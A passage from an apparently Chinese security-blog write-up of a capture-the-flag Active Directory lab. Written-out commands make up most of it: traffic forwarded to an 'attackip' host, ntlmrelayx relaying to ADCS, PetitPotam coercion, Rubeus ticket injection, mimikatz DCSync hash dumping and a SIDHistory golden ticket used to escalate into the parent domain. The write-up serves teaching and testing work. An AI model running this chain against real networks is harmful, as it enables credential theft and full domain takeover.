然后把受控机的8445端口转发到黑客机器的445端口上，

    
    
    rportfwd 8445 attackip 445
    

最后攻击者机器利用受控机的socks代理开启impacket监听：

    
    
    proxychains4 ntlmrelayx.py -t http://10.1.16.82/certsrv/certfnsh.asp -smb2support --adcs --template 'domain controller'
    

![](https://p5.ssl.qhimg.com/t01684af56b89590304.png)

如果没上cs的话，可以用

    
    
    https://github.com/Arno0x/DivertTCPconn
    

在域外机器上利用netsh端口转发，将本地的8445转发到攻击者机器上的445上

    
    
    netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8445 connectaddress=attackip connectport=445
    
    
    
    netsh interface portproxy show all
    

![](https://p4.ssl.qhimg.com/t01a038564382347292.png)

一样将本机445端口流量重定向到8445上

    
    
    divertTCPConn.exe 445 8445 debug
    

使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证

    
    
    PetitPotam.exe 10.1.16.68 10.1.16.80 1
    

![](https://p0.ssl.qhimg.com/t010214b0426209bf70.png)

最后我们利用上面获取到的证书，使用Rubeus.exe获取tgt并注入：

    
    
    Rubeus.exe asktgt /user:DC2$ /certificate:打印出来的base64证书数据 /ptt
    

![](https://p1.ssl.qhimg.com/t0185e6c000f9eb4e0d.png)

最后可以利用mimikatz，进行导出hash

    
    
    mimikatz.exe "lsadump::dcsync /all /csv /domain:net.iSoon2021.lab"
    

![](https://p5.ssl.qhimg.com/t0187cf65921ff18fd4.png)

拿到导出的域管hash,pth横向依此拿到dc2和dc1上的flag。

## 0x06 dc1.net.iSoon2021.lab

现在已经拿到子域域控的权限。

![](https://p5.ssl.qhimg.com/t017e46e9f4a33dda49.png)

有个155的段，端口扫描可得:10.10.155.10 为父域控。

## 0x07 dc.iSoon2021.lab

**关于sid history**

​ 当同林下创建新域时, EA 组的 SID 固定为根域的 SID, 组 ID 也是固定的 519, 此时, 如果用 EA 组的 SID 设置
SIDHistory 属性并和金票结合,那么一旦当我们拿到了林中任意一个域的 krbtgt NTLM, 即可实现到同林根域的
“跨域金票”拿到了根域,也就等于变相拿到林中的所有其它域,因为林根源对同林下所有域都有管理权。

  * 同一个域林中, 林根域和其它树根域之间会自动建立可传递的双向信任关系
  * 同一个域树中, 父域和子域之间会自动建立可传递的双向信任关系
  * 不同林之间为了实现资源共享, 也可手动建立信任关系, 这种信任关系可以是双向, 也可是单向, 具体依据实际配置而定

    
    
    nltest /domain_trusts
    

![](https://p0.ssl.qhimg.com/t01440d49c5022ccff0.png)

从上面的命令可以看出来，父域和子域是存在双向的信任关系。

通过生成SIDHistory 版黄金票据完成对父域的提权。  
这里首先需要获取以下参数:

  * /user 要伪造的用户,通常直接 administrator
  * /domain 当前子域名 FQDN
  * /sid 当前子域 sid
  * /krbtgt 当前子域 krbtgt ntlm hash
  * /sids 根域 sid + EA 组 id(默认 519)

这里可以使用powerview+mimikatz收集。

之后创建票据并注入，命令：

    
    
    mimikatz.exe "kerberos::golden /user:administrator /domain:net.iSoon2021.lab /sid:S-1-5-21-1313431314-2338497662-1182907679 /krbtgt:d5e25ff9a650238a511f95076a1288d3 /sids:S-1-5-21-3103963290-13490155-3681442193-519 /ptt""exit"
    

![](https://p4.ssl.qhimg.com/t01116eaf3d9ab9cfc5.png)

用主机名访问，不然会出错，访问父域成功

![](https://p4.ssl.qhimg.com/t01b7a9caca077daaf5.png)

使用mimikatz导出根域的hash

    
    
    mimikatz.exe "lsadump::dcsync /domain:iSoon2021.lab /all /csv"
    

![](https://p2.ssl.qhimg.com/t014931ec03866cfe1f.png)

pth上线父域控，C盘根目录下读flag。

## 参考文章

[【技术原创】Confluence利用指南 – 嘶吼 RoarTalk –
回归最本质的信息安全,互联网安全新媒体,4hou.com](https://www.4hou.com/posts/n6Z7)

[域渗透-SID History权限维持及域信任攻击 – gakkkkkkiii
(c0bra.xyz)](https://www.c0bra.xyz/2021/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F-SID-History%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E5%9F%9F%E4%BF%A1%E4%BB%BB%E6%94%BB%E5%87%BB/)

[ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller
Machine Certificate – Red Teaming Experiments
(ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Shu1L** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/262921](/post/id/262921)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) Shu1L

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

